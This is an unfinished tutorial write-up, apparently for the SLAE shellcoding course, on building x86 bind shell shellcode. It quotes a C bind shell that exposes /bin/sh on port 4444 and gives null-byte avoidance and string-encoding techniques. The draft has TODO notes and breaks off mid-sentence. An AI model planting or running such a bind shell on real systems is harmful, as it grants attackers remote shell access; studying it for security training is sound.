# WIP - Assignment 1 - Bind Shell

TODO: Intro to this article... assembly by hand, then writing a shellcode generator.

## What does a Bind Shell need to do?

A high level overview of a Bind Shell is that it creates a socket, binds that
socket to a port, listens for a connection, accepts a connect, then duplicates
STDIN, STDOUT, and STDERR to the file descriptor of the connected socket, and
finally execs /bin/sh (or another shell). One of my favorite free resources for shellcoding is the tutorial series by Azeria Labs for exploitation on the ARM architecture. I outlined what my shellcode needed to accomplish by looking at Azeria's C version of a [bind shell](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/):
```C
    // Create new TCP socket 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize sockaddr struct to bind socket using it 
    hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order

    // Bind socket to IP/Port in sockaddr struct 
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    // Listen for incoming connections 
    listen(host_sockid, 2); 

    // Accept incoming connection 
    client_sockid = accept(host_sockid, NULL, NULL); 

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 

    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid);
```

## First Approach: Writing Assembly by Hand

Writing unobfuscated shellcode in x86 assembly is straightforward. It consists of moving the appropriate values into registers for a series of system calls. A quick ```man 2 syscall``` reveals the calling convention and Application Binary Interface (ABI). However, a few issues require some forethought: 
1. Avoiding null bytes (0x00) or other bad characters if needed
    - XOR a register with itself to zero it out, e.g. ```xor eax, eax``` instead of ```mov eax, 0```
    - Write to 8- or 16-bit registers to avoid leading zeros, e.g. ```mov al, 10``` instead of ```mov eax, 10```
2. Building a *sockaddr* struct on the stack
3. Strings, because our code is position independent

### Headache #1 - Building a sockaddr
Re-write this better later: I tripped over the ```struct sockaddr *``` required as the second argument to the *bind* syscall. What order were the address family, port, and IP address to be passed? Where was the padding?

I used a "Guess and Check" approach, writing assembly to build various permutations of this on the stack:

| value     | location  | meaning               |
|------     | --------- | -----                 |
|0x02005555 | rsp       | AF\_INET, port 0x5555 |
|0x00000000 | rsp + 4   | INADDR\_ANY           |

This *seemed* right. However, when I compiled and ran ```printf("size = %d\n",
sizeof(struct sockaddr));``` and saw the struct consisted of 16 bytes, that
suggest *four* 32-bit (4 byte) values, not two. Sadly, I got stuck at this juncture and looked for how someone else did it:

Another SLAE student [https://github.com/ricardojoserf/slae32/tree/master/a1_Shell_Bind_Tcp](https://github.com/ricardojoserf/slae32/tree/master/a1_Shell_Bind_Tcp)
pushed first the IPv4 address, then the port number as a *word*, and lastly the *sin\_family* as a *word*.  

TODO: draw a diagram of how it actually looked on the stack

Creating the parameters to *execve* was simple. The important first parameter was to create the null-terminated string "/bin/sh\0". To obviate the need to pinpoint a specific byte for NULLing, I used the **extra slashes in paths** technique to pad the string to two 32-bit strings: "/bin" and "//sh". These I converted to hex values with Python:
```
Python 3.5.2 (default, Oct  7 2020, 17:19:02) 
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> code = "//sh"
>>> rev = code[::-1]
>>> rev.encode("utf-8").hex()
'68732f2f'
>>> code = "/bin"
>>> rev = code[::-1]
>>> rev.encode("utf-8").hex()
'6e69622f'
```

## Second Approach: Shellcode Generator with Configurable Port Number

for accept existed but it wasn't supported
